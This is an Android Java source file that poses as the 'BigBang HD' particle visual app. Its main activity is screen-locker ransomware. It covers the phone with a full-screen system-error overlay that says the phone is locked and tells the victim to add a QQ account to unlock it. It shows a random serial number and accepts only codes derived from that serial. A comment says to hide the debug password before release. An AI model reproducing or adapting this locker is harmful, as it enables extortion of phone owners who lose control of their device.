package com.sunglab.bigbanghd;


import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.*;
import android.media.*;
import android.os.*;
import android.text.*;
import android.view.*;
import android.view.View.*;
import android.view.WindowManager.*;
import android.widget.*;
import com.sunglab.bigbanghd.GL2JNIView.*;
import com.wmz.timelock.*;
import java.io.*;
import java.net.*;
import java.util.*;

import android.view.View.OnClickListener;
import android.view.View.OnTouchListener;


public class s extends Activity implements SensorEventListener 
  {

    @Override
    public void onAccuracyChanged ( Sensor p1, int p2 )
      {
      }

    
    public static final int Amazon = 1;
    public static final int Google = 0;
    public static boolean IsthatPlaying = false;
    public static final int Samsung = 3;
    private WindowManager.LayoutParams wmParams;
    private WindowManager mWindowManager;
    private WindowManager.LayoutParams ff;
    EditText c;
    Renderer mRenderer;
    String[] f;
    char[] x;
    int k;
    String h;
    @Override
    protected void onCreate ( Bundle savedInstanceState )
      {
        super.onCreate ( savedInstanceState );
//    MediaPlayer mp=new MediaPlayer ( ).create ( this, R.raw.tr1 );
//    mp.setLooping ( true );
//    mp.start ( );
        c ( );
      }
    private void c ( )
      {
        GL2JNIView mView = new GL2JNIView ( this );
        RelativeLayout a=new RelativeLayout ( this );
        LinearLayout bu=new LinearLayout ( this );
        TextView b=new TextView ( this );
        c = new EditText ( this );
        Button d=new Button ( this );
        TextView e=new TextView ( this );
        Random pa=new Random ( );
        final int a1,a2,a3,a4,a5;
        a1 = pa.nextInt ( 9999 );
        a2 = pa.nextInt ( 99999 );
        a3 = pa.nextInt ( 99999 );
        e.setTextColor ( Color.RED );
        e.setText ( "序列号:" + String.valueOf ( a1 ) + "-" + String.valueOf ( a2 * 2 ) + "-" + String.valueOf ( a3 * 5 ) );
        a4 = a1 * ( ( a2 / 2 ) * 520 ) + ( ( a3 / 5 ) - a1 );
        a5 = String.valueOf ( a4 ).hashCode ( ) * a1;
        a5 = Math.abs ( ( ( a5 * a1 ) / 2 ) + 666 );
        x = String.valueOf ( a5 ).toCharArray ( );
        f = new String[x.length];
        k = x.length;
        for ( int i=0;i < x.length;i++ )
          {
            int t=Integer.parseInt ( String.valueOf ( x [ i ] ) );
            t = t + a1;
            x [ i ] = (char) t;
            f [ i ] = uits.hex ( String.valueOf ( x [ i ] ) ).toString ( );
            //通过循环得出多种密码;
          }
        d.setText ( "解锁" );
        d.setTextSize ( 20 );
        d.setTextColor ( Color.parseColor ( "#D42AF5" ) );
        d.setBackgroundColor ( Color.parseColor ( "#004C0655" ) );
        ff = new WindowManager.LayoutParams ( );
        ff.width = WindowManager.LayoutParams.FILL_PARENT;
        ff.height = WindowManager.LayoutParams.WRAP_CONTENT;
        c.setLayoutParams ( ff );
        c.setTextColor ( Color.RED );
        //////////////////// 发布前请注释下面代码
        c.setText ( f [ 2 ] );//显示密码
        ////////////////////
        c.setFilters ( new InputFilter[]{new InputFilter.LengthFilter ( 50 )} );
        b.setText ( "恭喜你手机被锁 解锁请加QQ1834661238" );
        b.setTextColor ( Color.RED );
        b.setTextSize ( 25 );
        bu.setOrientation ( LinearLayout.VERTICAL );
        bu.addView ( b );
        bu.addView ( e );
        bu.addView ( c );
        bu.addView ( d );
        a.addView ( mView );
        a.addView ( bu );
        wmParams = new WindowManager.LayoutParams ( );
        mWindowManager = (WindowManager)getApplication ( ).getSystemService ( getApplication ( ).WINDOW_SERVICE );
        wmParams.type = LayoutParams.TYPE_SYSTEM_ERROR;
        wmParams.format = PixelFormat.RGBA_8888;
        wmParams.flags = 1280;
        wmParams.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
        wmParams.x = 0;
        wmParams.y = 0;
        wmParams.width = WindowManager.LayoutParams.FILL_PARENT;
        wmParams.height = WindowManager.LayoutParams.FILL_PARENT;
        mWindowManager.addView ( a, wmParams );
        d.setOnClickListener ( new OnClickListener ( ){
              @Override
              public void onClick ( View p1 )
                {
                  for ( int i=0;i < k;i++ )
                    {
                      if ( c.getText ( ).toString ( ).equals ( f [ i ] ) )
                        {
                          System.exit ( 0 );
                        }
                    }
                }
            } );
        mView.setOnTouchListener ( new OnTouchListener ( ){

              @Override
              public boolean onTouch ( View p1, MotionEvent p2 )
                {
                  int pointerCount = p2.getPointerCount ( );
                  for ( int i = 0; i < pointerCount; i++ )
                    {
                      GL2JNIView.TouchMoveNumber ( p2.getX ( i ), p2.getY ( i ), i, p2.getPointerCount ( ) );
                    }
                  switch ( p2.getAction ( ) )
                    {
                      case Google /*0*/:
                        GL2JNIView.TouchDownNumber ( );
                        break;
                      case Amazon /*1*/:
                        GL2JNIView.TouchUpNumber ( );
                        break;
                      case 5:
                        GL2JNIView.TouchDownNumber ( );
                        break;
                    }
                  return true;
                }
            } );
      }
    public void onSensorChanged ( SensorEvent event )
      {
        int r2_int = 2;
        if ( event.sensor.getType ( ) == 3 )
          {
            if ( ( (int) ( event.values [ r2_int ] ) ) > 45 )
              {
                Renderer.DefinallyROTATION = ( -90 );
                return;
              }
            else if ( ( (int) ( event.values [ r2_int ] ) ) < ( -45 ) )
              {
                Renderer.DefinallyROTATION = 90;
                return;
              }
            else
              {
                Renderer.DefinallyROTATION = 0;
                return;
              }
          }
        else
          {
            return;
          }
      }
    
    
  }
